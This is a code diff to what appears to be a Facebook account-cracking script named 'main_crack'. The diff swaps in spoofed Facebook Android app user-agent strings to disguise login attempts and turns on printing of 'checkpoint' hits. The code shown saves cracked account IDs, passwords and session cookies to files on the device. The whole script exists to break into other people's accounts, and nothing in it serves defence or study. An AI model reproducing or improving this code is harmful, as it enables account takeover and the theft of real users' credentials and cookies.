@@ -274,14 +274,7 @@ filter = []
 def randBuildLSB():
     vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
     VAPP = random.randint(410000000,499999999)
-    #$ua = '[FBAN/FB4A;FBAV/420.0.0.32.61;FBBV/429501109;FBDM/{density=1.2,width=1280,height=960};FBLC/en_PK;FBRV/0;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G980F;FBSV/13;FBOP/1;FBCA/x64:armeabi-v7a;]'
-    ua = 'Dalvik/2.1.0 (Linux; U; Android 12; SM-G920F Build/TQ1A.948559.045) [FBAN/FB4A;FBAV/309.0.0.99.97;FBBV/377975134;FBRV/0;FBPN/com.facebook.katana;FBLC/ar_LY;FBMF/Samsung;FBBD/Samsung;FBDV/SM-G920F;FBSV/12;FBCA/x64:arm64-v8a;FBDM/{density=1.2128505945870784,width=405,height=780};FB_FW/1]'
-    ##ua = '[FBAN/FB4A;FBAV/431.0.0.53.10;FBBV/429501109;FBDM/{density=1.2,width=1280,height=960};FBLC/en_PK;FBRV/0;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/RMX471C;FBSV/10;FBOP/1;FBCA/x64:armeabi-v7a;]'
-    ##ua = '[FBAN/FB4A;FBAV/59.0.0.0.189;FBBV/19392060;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/72234;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 2;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]'
-    ##ua = 'Dalvik/2.1.0 (Linux; U; Android 11; Nokia Build/TT0.201005.001) [FBAN/FB4A;FBAV/409.0.0.27.106;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/462563379;FBCR/Telstra;FBMF/HMD Global;FBBD/Nokia;FBDV/Nokia0;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=720,height=1479};FB_FW/1;FBRV/465181455;]'
-    ##ua = 'Dalvik/2.1.0 (Linux; U; Android 10; Nokia787 Build/429651.001) [FBAN/FB4C;FBAV/410.0.0.28.107;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/364420;FBCR/Verizon;FBMF/Nokia;FBBD/Nokia;FBDV/Nokia787;FBSV/11;FBCA/arm64-v8a;FBDM/density=3.00,width=1310,height=1185;FB_FW/2;FBRV/6004]'
-    ##ua = 'Dalvik/2.1.0 (Linux; U; Android 12; Google Pixel859 Build/406839.001) [FBAN/FB4A;FBAV/410.0.0.28.107;FBPN/com.facebook.katana;FBLC/en_UK;FBBV/136950;FBCR/T-Mobile;FBMF/Google Pixel;FBBD/Google Pixel;FBDV/Google Pixel859;FBSV/11;FBCA/arm64-v8a;FBDM/density=2.57,width=667,height=2254;FB_FW/2;FBRV/841806]'
-    ##ua = '[FBAN/FB4A;FBAV/245.0.0.39.118;FBPN/com.facebook.katana;FBLC/hr_BA;FBBV/180475968;FBCR/TELCEL;FBMF/Hisense;FBBD/Hisense;FBDV/Hisense Hi 3;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720height=1280};FB_FW/1;FBRV/181817659;] FBBK/1]'
+    ua = '[FBAN/FB4A;FBAV/370.0.0.16.116;FBBV/174075079;FBLC/en_GB;FBRV/175415557;FBCR/Grameenphone;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A125F;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=2034};]'
     return ua
 
 def randFBAN():
@@ -458,7 +451,7 @@ class main_crack():
                     open('/sdcard/RJ_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RJ_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                     #print(f"\r{A} [RJ-CP] {sid} | {ps} {S}")
+                     print(f"\r{A} [RJ-CP] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/RJ_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
